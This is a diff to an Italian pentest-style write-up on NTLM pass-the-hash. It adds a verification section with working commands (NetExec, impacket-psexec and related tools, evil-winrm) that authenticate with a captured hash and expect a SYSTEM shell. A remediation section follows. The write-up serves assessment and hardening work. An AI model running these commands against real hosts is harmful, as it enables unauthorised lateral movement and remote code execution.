@@ -24,6 +24,21 @@ Gli hash NTLM delle password, recuperati da database, memoria o file di un siste
 
 Un singolo hash amministrativo recuperato su un host compromesso consente l'accesso a tutti i sistemi dove quell'account ha privilegi: il movimento laterale diventa immediato e difficile da rilevare.
 
+## Verifica
+
+```
+# Verifica dell'hash con NetExec:
+nxc smb <IP> -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
+
+# Uso (impacket — nota: i tool moderni sono impacket-*, vedi nota impacket):
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@<IP>
+# equivalenti: impacket-wmiexec / impacket-smbexec / impacket-atexec
+
+# oppure evil-winrm se la 5985/5986 è aperta:
+evil-winrm -i <IP> -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
+```
+Atteso: shell come l'utente dell'hash (qui NT AUTHORITY\SYSTEM).
+
 ## Remediation
 
 Ridurre l'esposizione degli hash: disabilitare NTLMv1 e limitare NTLM dove possibile a favore di Kerberos, implementare LAPS per le password amministrative locali, proteggere gli account privilegiati con tiering (no logon interattivo su sistemi meno fidati), abilitare Credential Guard e monitorare gli accessi anomali.
